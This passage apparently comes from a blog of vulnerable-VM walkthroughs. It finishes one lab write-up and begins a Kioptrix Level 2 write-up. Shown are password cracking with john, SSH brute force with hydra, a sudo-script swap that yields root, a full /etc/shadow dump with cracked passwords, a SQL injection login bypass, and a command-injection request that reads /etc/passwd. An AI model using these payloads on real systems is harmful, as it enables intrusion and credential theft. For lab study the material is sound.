</span><span class='line'>0                (dtraylor)
</span><span class='line'>consumer         (sjohnson)
</span><span class='line'>gawker           (jduff)
</span><span class='line'>kotaku           (swarren)
</span><span class='line'>babyl0n          (jdavenport)
</span><span class='line'>gizmodo          (qpowers)</span></code></pre></td></tr></table></div></figure>


<p>Trying to login through ssh:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john --format=mysql-sha1 hashes.csv --show | grep : > ~/user-pass.list
</span><span class='line'>root@kali32:~# hydra -C user-pass.list 192.168.1.120 ssh</span></code></pre></td></tr></table></div></figure>


<p>We use one of the accounts to log in and check if there is any user with the higher privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rdominguez@slax:~$ cat /etc/group
</span><span class='line'>root:x:0:root
</span><span class='line'>bin:x:1:root,bin
</span><span class='line'>daemon:x:2:root,bin,daemon
</span><span class='line'>sys:x:3:root,bin,adm
</span><span class='line'>adm:x:4:root,adm,daemon
</span><span class='line'>tty:x:5:
</span><span class='line'>disk:x:6:root,adm
</span><span class='line'>lp:x:7:lp
</span><span class='line'>mem:x:8:
</span><span class='line'>kmem:x:9:
</span><span class='line'>wheel:x:10:root
</span><span class='line'>floppy:x:11:root
</span><span class='line'>mail:x:12:mail
</span><span class='line'>news:x:13:news
</span><span class='line'>uucp:x:14:uucp
</span><span class='line'>man:x:15:
</span><span class='line'>audio:x:17:root
</span><span class='line'>video:x:18:root
</span><span class='line'>cdrom:x:19:root
</span><span class='line'>games:x:20:
</span><span class='line'>slocate:x:21:
</span><span class='line'>utmp:x:22:
</span><span class='line'>smmsp:x:25:smmsp
</span><span class='line'>tape:x:26:root
</span><span class='line'>mysql:x:27:
</span><span class='line'>rpc:x:32:
</span><span class='line'>sshd:x:33:sshd
</span><span class='line'>gdm:x:42:
</span><span class='line'>shadow:x:43:
</span><span class='line'>ftp:x:50:
</span><span class='line'>apache:x:80:
</span><span class='line'>messagebus:x:81:
</span><span class='line'>haldaemon:x:82:
</span><span class='line'>plugdev:x:83:root
</span><span class='line'>power:x:84:
</span><span class='line'>pop:x:90:pop
</span><span class='line'>scanner:x:93:
</span><span class='line'>nobody:x:98:nobody
</span><span class='line'>nogroup:x:99:
</span><span class='line'>users:x:100:ccoffee
</span><span class='line'>console:x:101:
</span><span class='line'>admin:x:102:ccoffee</span></code></pre></td></tr></table></div></figure>


<p>Right, ccoffee is in admin group. For other users it is not allowed to use sudo.</p>

<p>We check his competencies:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ssh 192.168.1.120 -l ccoffee
</span><span class='line'>ccoffee@192.168.1.120's password:
</span><span class='line'>Linux 2.6.27.27.
</span><span class='line'>ccoffee@slax:~$ sudo -l
</span><span class='line'>User ccoffee may run the following commands on this host:
</span><span class='line'>    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh</span></code></pre></td></tr></table></div></figure>


<p>There is a script in his home directory that he can execute, unfortunately we
cannot read the content. Removing the script and creating a new one with the
content &lsquo;sh&rsquo; gives root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ccoffee@slax:~/scripts$ sudo ./getlogs.sh
</span><span class='line'>sh-3.1#
</span><span class='line'>
</span><span class='line'>sh-3.1# cat /etc/shadow
</span><span class='line'>root:$1$rxn0aycI$hsQIsFGccfDbCG5/1nfH91:16567:0:::::
</span><span class='line'>bin:*:9797:0:::::
</span><span class='line'>daemon:*:9797:0:::::
</span><span class='line'>adm:*:9797:0:::::
</span><span class='line'>lp:*:9797:0:::::
</span><span class='line'>sync:*:9797:0:::::
</span><span class='line'>shutdown:*:9797:0:::::
</span><span class='line'>halt:*:9797:0:::::
</span><span class='line'>mail:*:9797:0:::::
</span><span class='line'>news:*:9797:0:::::
</span><span class='line'>uucp:*:9797:0:::::
</span><span class='line'>operator:*:9797:0:::::
</span><span class='line'>games:*:9797:0:::::
</span><span class='line'>ftp:*:9797:0:::::
</span><span class='line'>smmsp:*:9797:0:::::
</span><span class='line'>mysql:*:9797:0:::::
</span><span class='line'>rpc:*:9797:0:::::
</span><span class='line'>sshd:*:9797:0:::::
</span><span class='line'>gdm:*:9797:0:::::
</span><span class='line'>pop:*:9797:0:::::
</span><span class='line'>apache:*:9797:0:::::
</span><span class='line'>messagebus:*:9797:0:::::
</span><span class='line'>haldaemon:*:9797:0:::::
</span><span class='line'>nobody:*:9797:0:::::
</span><span class='line'>myajima:$1$60c/cucI$5j0aMHbj4jNDRAYhb4m3K0:16567:0:99999:7:::
</span><span class='line'>lmartinez:$1$rMh/hucI$Pr6vOoriwdZPgphX0nSTa1:16567:0:99999:7:::
</span><span class='line'>mbryan:$1$.di/mucI$oOj2Jz4nBoVxTqDo1im.X0:16567:0:99999:7:::
</span><span class='line'>krenfro:$1$Hvj/rucI$Cg2UjwsziydtkBqypwdHp/:16567:0:99999:7:::
</span><span class='line'>dgilfillan:$1$V7l/wucI$cKtiNIUgy2TYFi5pxWCCH.:16567:0:99999:7:::
</span><span class='line'>jduff:$1$uJm//vcI$llf6cmzpyYX84rgky6lfK0:16567:0:99999:7:::
</span><span class='line'>amaynard:$1$QZn/4vcI$8QI5BxGxAMU/aCl7IJ1Nm1:16567:0:99999:7:::
</span><span class='line'>aallen:$1$kso/9vcI$woWfNYjoIWhvV6r5j7Xxa/:16567:0:99999:7:::
</span><span class='line'>aadams:$1$q5q/EvcI$yWIE/.cQu8APDgjY.5ABV/:16567:0:99999:7:::
</span><span class='line'>aard:$1$INr/JvcI$8S6mudd4gUth0CmMxh.Ab0:16567:0:99999:7:::
</span><span class='line'>rpatel:$1$scs/OvcI$8jSf3YcG9TpSU6yuI6q5G0:16567:0:99999:7:::
</span><span class='line'>qpowers:$1$7st/TvcI$7GqfQsXLy2v8CosCkCTNV1:16567:0:99999:7:::
</span><span class='line'>dstevens:$1$d4v/YvcI$dRWsGihSIwWOCOV1uIzzv.:16567:0:99999:7:::
</span><span class='line'>bphillips:$1$2Lw/dvcI$yr0cO6WTpKMPv89xi99Hi/:16567:0:99999:7:::
</span><span class='line'>aheflin:$1$mjx/ivcI$1hvn.7HlbUqLB2Vp.WRpn0:16567:0:99999:7:::
</span><span class='line'>mrodriguez:$1$80z/nvcI$W7S6KtvKXWiJAaDjU6Cbd/:16567:0:99999:7:::
</span><span class='line'>tgoodchap:$1$ER.0svcI$F6ZxBlWOy6pQUlhDC7.VD1:16567:0:99999:7:::
</span><span class='line'>djohnson:$1$Ej/0xvcI$8lRyGhMsdM8OUYA5qbDs1.:16567:0:99999:7:::
</span><span class='line'>mholland:$1$I5100wcI$9tJothOx.INRYNMF7016P/:16567:0:99999:7:::
</span><span class='line'>dtraylor:$1$OT205wcI$vlX3N7czGPvJGOCgOXDzA0:16567:0:99999:7:::
</span><span class='line'>bwatkins:$1$Um30AwcI$Xb333lgx4Mcx7PApUoQnN/:16567:0:99999:7:::
</span><span class='line'>rjacobson:$1$6650FwcI$yHSb8Kr7hUHyny3Y.mDXQ0:16567:0:99999:7:::
</span><span class='line'>jfranklin:$1$Ti60KwcI$nKUPLiDD67sl9lUTf3aJ90:16567:0:99999:7:::
</span><span class='line'>swarren:$1$2y70PwcI$DpY/2bG7k.DUI.E0i19Fh/:16567:0:99999:7:::
</span><span class='line'>mnader:$1$3K90UwcI$3vkAOSnLqK44jBF.kDVWE1:16567:0:99999:7:::
</span><span class='line'>strammel:$1$QmA0ZwcI$mp5SxAjrzs1nqjf6cxztK1:16567:0:99999:7:::
</span><span class='line'>rdominguez:$1$gIC0ewcI$7VCqMoXzYKW1vgzCaglJ6.:16567:0:99999:7:::
</span><span class='line'>jbresnahan:$1$qnD0jwcI$yg30Ub/pK3fcx9U50VP701:16567:0:99999:7:::
</span><span class='line'>cchisholm:$1$K7F0owcI$3WhfwvSnQzEfvVWjZnhm2/:16567:0:99999:7:::
</span><span class='line'>aspears:$1$/ZG0twcI$o1Yw0aAr86poWqk7.PZy3.:16567:0:99999:7:::
</span><span class='line'>dwestling:$1$QxH0ywcI$yXczKrqz56FctGhw3AKV41:16567:0:99999:7:::
</span><span class='line'>sjohnson:$1$1hJ01xcI$hRY/wfBlj3cYqCpPrdO1j.:16567:0:99999:7:::
</span><span class='line'>hlovell:$1$U9L06xcI$kj0vAVGLnx.9TcQr88ZoN0:16567:0:99999:7:::
</span><span class='line'>tdeleon:$1$UaM0BxcI$i9zo//F6m3IGEXWF4E4VU.:16567:0:99999:7:::
</span><span class='line'>ccoffee:$1$FDO0GxcI$1Gl5A67Slt0mhD7iiZaLr/:16567:0:99999:7:::
</span><span class='line'>jalvarez:$1$EbP0LxcI$pMZtEjdYdkrQRCuyw3zQ00:16567:0:99999:7:::
</span><span class='line'>jalcantar:$1$H4R0QxcI$HFlaU41TFGRu0LAC0Fv0g.:16567:0:99999:7:::
</span><span class='line'>sgains:$1$hiS0VxcI$FCEDYdN96OmIfnttnE6f21:16567:0:99999:7:::
</span><span class='line'>bbanter:$1$99U0axcI$TONdzMbnM4yotrbmBCTU7/:16567:0:99999:7:::
</span><span class='line'>lmorales:$1$WZV0fxcI$l5OZvem/JITin7SydRcoS.:16567:0:99999:7:::
</span><span class='line'>jayala:$1$5zW0kxcI$ghdAHJPWYrkNWLatUJwxe1:16567:0:99999:7:::
</span><span class='line'>kclemons:$1$lIY0pxcI$/4/W5o0NzWszs9aKQyZVt/:16567:0:99999:7:::
</span><span class='line'>aharp:$1$qdZ0uxcI$OdHV6pN42eG9DoYc.ToNo0:16567:0:99999:7:::
</span><span class='line'>kwebber:$1$.Eb0zxcI$sdvd7YNQIBUhTFGfBr./W/:16567:0:99999:7:::
</span><span class='line'>dgrant:$1$2cc02ycI$IL9nHFcDzbkDsj97kJk860:16567:0:99999:7:::
</span><span class='line'>jdavenport:$1$uJo0cycI$wH8zAEudh0JToiTfDFYwT/:16567:0:99999:7:::
</span><span class='line'>ktso:$1$/ff0CycI$2mPgNapzGACNxu0MXFs4P1:16567:0:99999:7:::
</span><span class='line'>aweiland:$1$TAh0HycI$pJtJ5xBl2AZc4nbKKBhR6.:16567:0:99999:7:::
</span><span class='line'>dcooper:$1$Egi0MycI$lxdN6qIIFOkCAPTHbk8Tu/:16567:0:99999:7:::</span></code></pre></td></tr></table></div></figure>


<p>We realized that the passwords are different when we reboot the server. Digging deeper, we find more clues:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/mnt/live/memory/changes# cat ./etc/rc.d/rc.local
</span><span class='line'>..
</span><span class='line'>root@slax:/mnt/live# vim /mnt/hdc/slax/rootcopy/opt/lampp/htdocs/setup.sh
</span><span class='line'>..
</span><span class='line'><span class="c">#Shuffle the users and passwords, create usernames, and match them up with passwords</span>
</span><span class='line'><span class="c">#The 50 passwords come from top 50 in Gawker media&#39;s password breach</span>
</span><span class='line'>shuf -o /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/pass50.txt
</span><span class='line'>shuf -o /opt/lampp/htdocs/users.txt /opt/lampp/htdocs/users.txt
</span><span class='line'>awk <span class="s1">&#39;/./ {print tolower(substr($1,1,1))tolower($2)}&#39;</span> /opt/lampp/htdocs/users.txt &gt; /opt/lampp/htdocs/usernames.txt
</span><span class='line'>paste -d<span class="s1">&#39; &#39;</span> /opt/lampp/htdocs/usernames.txt /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/users.txt &gt; /opt/lampp/htdocs/userpass.txt
</span><span class='line'>..
</span><span class='line'>
</span><span class='line'><span class="c">#Set root OS password</span>
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;root:I@47hdlT!@!&quot;</span> <span class="p">|</span> chpasswd
</span><span class='line'>
</span><span class='line'><span class="c">#Root password clue in jdavenport&#39;s home dir</span>
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;I ate 47 hot dogs last Tuesday!@!&quot;</span> &gt; /home/jdavenport/svrc.txt
</span><span class='line'>..
</span><span class='line'>
</span><span class='line'><span class="c">#Vulnerable script placed in ccoffee&#39;s home dir with a hidden password</span>
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;#!/bin/bash</span>
</span><span class='line'><span class="s2">if [ \&quot;\$2\&quot; == \&quot;emerald\&quot; ]; then</span>
</span><span class='line'><span class="s2">        while read line</span>
</span><span class='line'><span class="s2">        do</span>
</span><span class='line'><span class="s2">                echo \$line</span>
</span><span class='line'><span class="s2">        done &lt; \$1</span>
</span><span class='line'><span class="s2">else</span>
</span><span class='line'><span class="s2">        echo &quot;</span>wrong!<span class="s2">&quot;</span>
</span><span class='line'><span class="s2">fi</span>
</span><span class='line'><span class="s2">&quot;</span> &gt; /home/ccoffee/scripts/getlogs.sh
</span></code></pre></td></tr></table></div></figure>


<p>Finally with this information, we was able to successfully crack the whole /etc/shadow:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john hashes.john --show
</span><span class='line'>root:I@47hdlT!@!:16567:0:::::
</span><span class='line'>myajima:12345678:16567:0:99999:7:::
</span><span class='line'>lmartinez:computer:16567:0:99999:7:::
</span><span class='line'>mbryan:sunshine:16567:0:99999:7:::
</span><span class='line'>krenfro:master:16567:0:99999:7:::
</span><span class='line'>dgilfillan:1234:16567:0:99999:7:::
</span><span class='line'>jduff:welcome:16567:0:99999:7:::
</span><span class='line'>amaynard:iloveyou:16567:0:99999:7:::
</span><span class='line'>aallen:pepper:16567:0:99999:7:::
</span><span class='line'>aadams:trustno1:16567:0:99999:7:::
</span><span class='line'>aard:123123:16567:0:99999:7:::
</span><span class='line'>rpatel:password:16567:0:99999:7:::
</span><span class='line'>qpowers:lifehack:16567:0:99999:7:::
</span><span class='line'>dstevens:cheese:16567:0:99999:7:::
</span><span class='line'>bphillips:baseball:16567:0:99999:7:::
</span><span class='line'>aheflin:football:16567:0:99999:7:::
</span><span class='line'>mrodriguez:kotaku:16567:0:99999:7:::
</span><span class='line'>tgoodchap:killer:16567:0:99999:7:::
</span><span class='line'>djohnson:consumer:16567:0:99999:7:::
</span><span class='line'>mholland:0:16567:0:99999:7:::
</span><span class='line'>dtraylor:princess:16567:0:99999:7:::
</span><span class='line'>bwatkins:jordan:16567:0:99999:7:::
</span><span class='line'>rjacobson:654321:16567:0:99999:7:::
</span><span class='line'>jfranklin:qwerty:16567:0:99999:7:::
</span><span class='line'>swarren:Password:16567:0:99999:7:::
</span><span class='line'>mnader:michelle:16567:0:99999:7:::
</span><span class='line'>strammel:letmein:16567:0:99999:7:::
</span><span class='line'>rdominguez:shadow:16567:0:99999:7:::
</span><span class='line'>jbresnahan:soccer:16567:0:99999:7:::
</span><span class='line'>cchisholm:whatever:16567:0:99999:7:::
</span><span class='line'>aspears:111111:16567:0:99999:7:::
</span><span class='line'>dwestling:123456:16567:0:99999:7:::
</span><span class='line'>sjohnson:batman:16567:0:99999:7:::
</span><span class='line'>hlovell:michael:16567:0:99999:7:::
</span><span class='line'>tdeleon:gawker:16567:0:99999:7:::
</span><span class='line'>ccoffee:gizmodo:16567:0:99999:7:::
</span><span class='line'>jalvarez:blahblah:16567:0:99999:7:::
</span><span class='line'>jalcantar:nintendo:16567:0:99999:7:::
</span><span class='line'>sgains:dragon:16567:0:99999:7:::
</span><span class='line'>bbanter:12345:16567:0:99999:7:::
</span><span class='line'>lmorales:jennifer:16567:0:99999:7:::
</span><span class='line'>jayala:666666:16567:0:99999:7:::
</span><span class='line'>kclemons:monkey:16567:0:99999:7:::
</span><span class='line'>aharp:passw0rd:16567:0:99999:7:::
</span><span class='line'>kwebber:superman:16567:0:99999:7:::
</span><span class='line'>dgrant:internet:16567:0:99999:7:::
</span><span class='line'>jdavenport:babyl0n:16567:0:99999:7:::
</span><span class='line'>ktso:starwars:16567:0:99999:7:::
</span><span class='line'>aweiland:abc123:16567:0:99999:7:::
</span><span class='line'>dcooper:pokemon:16567:0:99999:7:::
</span><span class='line'>
</span><span class='line'>50 password hashes cracked, 0 left</span></code></pre></td></tr></table></div></figure>


<p>There is also a trace that the root user connected via ssh to another server with IP address 192.168.1.20:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:~# cat .ssh/known_hosts
</span><span class='line'>192.168.1.20 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA3ViCbImH/GTN+b1DigEYLnrUSHk8J7ZEt6+IX1etXQx89VQXhKAh098dpoUIAlnYIIsCcvmqHSwbCY0JxwwoV7bHqfQB/y05hWv//hQ6hhOIJBJfTOuezAgMxEbZbfaEJf5U3ROhGd4TbdIrsaoPruQ9asG/ok6yrWfKBK6pcizIxL/Q+uvRlcC8X=</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 2]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/11/kioptrix-level-2/"/>
    <updated>2015-05-11T19:15:08+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/11/kioptrix-level-2</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix: Level 1.1 (#2)</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE  VERSION
</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
</span><span class='line'>MAC Address: 00:0C:29:53:19:4C (VMware)</span></code></pre></td></tr></table></div></figure>


<p>We connect to the web page and log in using username / password (SQLi):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>test' or '1'='1</span></code></pre></td></tr></table></div></figure>


<p>Now we got the access to the &ldquo;Basic Administrative Web Console&rdquo;. Trying command
injection, we found out that we can inject arbitrary command and execute under
web user privileges.</p>

<p>Request / response example:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /pingit.php HTTP/1.1
</span><span class='line'>Host: 192.168.80.144
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: http://192.168.80.144/index.php
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 45
</span><span class='line'>
</span><span class='line'>ip=127.0.0.1 %26%26 cat /etc/passwd&submit=submit</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HTTP/1.1 200 OK
</span><span class='line'>Date: Sat, 09 May 2015 15:02:56 GMT
</span><span class='line'>Server: Apache/2.0.52 (CentOS)
</span><span class='line'>X-Powered-By: PHP/4.3.9
</span><span class='line'>Content-Length: 2187
</span><span class='line'>Connection: close
</span><span class='line'>Content-Type: text/html; charset=UTF-8
</span><span class='line'>
</span><span class='line'>127.0.0.1 && cat /etc/passwd&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.008 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.015 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1999ms
</span><span class='line'>rtt min/avg/max/mdev = 0.008/0.012/0.015/0.005 ms, pipe 2
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
</span><span class='line'>news:x:9:13:news:/etc/news:
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
